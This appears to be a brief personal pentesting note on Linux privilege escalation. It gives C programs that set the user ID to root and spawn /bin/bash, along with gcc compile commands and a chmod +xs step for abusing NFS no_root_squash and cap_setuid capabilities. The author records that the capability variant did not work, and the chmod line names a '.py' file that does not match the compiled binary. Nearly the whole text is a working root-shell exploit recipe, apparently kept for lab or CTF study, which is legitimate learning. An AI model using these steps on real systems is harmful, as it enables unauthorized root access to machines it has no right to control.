
for use with for example [[nfs - no_root_squash]]

```c
int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

compile
`gcc runbash.c -o runbash`

if exploiting nfs no_root_squash, set suid after moving the file

set executable and suid/sgid but
`chmod +xs runbash.py`

---

for use with cap_setuid+ep
```c
#include<stdlib.h>
#include<unistd.h>
int main(){
        setuid(0);
        system("/bin/bash");
        return 0;
}
```

`gcc -static cap_setuid_ep.c -o cap_setuid_ep`

Did not work!

might python use another function in the bg that uses capabilities?